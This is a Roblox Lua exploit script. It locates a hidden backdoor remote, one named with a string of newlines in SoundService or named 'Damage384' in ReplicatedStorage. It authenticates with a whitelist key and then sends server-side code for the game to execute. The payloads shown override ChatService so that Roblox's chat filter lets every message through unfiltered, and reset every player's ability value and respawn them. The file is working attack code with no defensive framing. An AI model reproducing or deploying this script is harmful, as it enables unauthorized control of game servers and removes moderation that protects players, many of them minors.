local r = game:GetService('SoundService'):FindFirstChild(("\n"):rep(15));

if not r then
    r = game:GetService('ReplicatedStorage'):FindFirstChild('Damage384');
    if not r then
        repeat wait(600) until nil
    end
end

local keys = {
	["_whitelist_code"] = "_WHITELIST_ME_STARSET IS RELEVANT RIGHT";
	["_backdoor_code"] = "_INITIATE_";
}

r:InvokeServer(keys._whitelist_code) -- whitelist

local using = {

    ChatFilter = {true,([[
        local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);
        chatservice.InternalApplyRobloxFilterNewAPI = function(self,sp,mes,textfilcon)
            return true,false,mes
        end;
        chatservice.InternalApplyRobloxFilter = function(self,sp,mes,toname)
            return mes
        end
    ]])};

    GiveAllStands = {false, ([[
        local TargetID = 0;

        for _,Player in next, game:GetService'Players':GetPlayers() do
            Player.Data.Ability.Value = TargetID;
            wait()
            Player:LoadCharacter()
        end;
    ]])};

};

local plr = game:GetService('Players').LocalPlayer

local returns = {}

for idx,code in next, using do
    if (code[1]) then
        returns[idx] = r:InvokeServer(keys._backdoor_code,code[2])
    end
end

local printstuff
printstuff = function(tbl,idx,indents)
    idx = idx or 'root';
    indents = indents or 0;

    local indent = ('    ')
    local ni = indent:rep(indents);local nni = indent:rep(indents+1);

    local function stringify_type(is_idx,i,o)
        local t = type(o);
        local ts = tostring;
        local oi=ts(i);local oo=ts(o)
        local haha = nni..'[%s] - %s;'
        local new_i = type(i) == 'string' and '"'..i..'"' or oi

        if is_idx then
            return new_i
        end

        if (t == 'table') then
            return printstuff(o, i, indents+1)
        elseif (t == 'string') then
            local new_o = '"'..oo..'"';
            return string.format(haha, new_i, new_o)
        else
            return string.format(haha, new_i, oo) -- idk what to do with function.
        end
    end

    local message = string.format('%s[%s] - {', ni, stringify_type(true, idx));
    for i,v in next, tbl do
        message = message .. '\n' .. stringify_type(false, i, v);
    end
    
    if indents == 0 then
        print(message..'\n};')
    else
        return message .. '\n' .. ni .. '}'..';'
    end
end

print()
for name,data in next, returns do
    printstuff(data);
end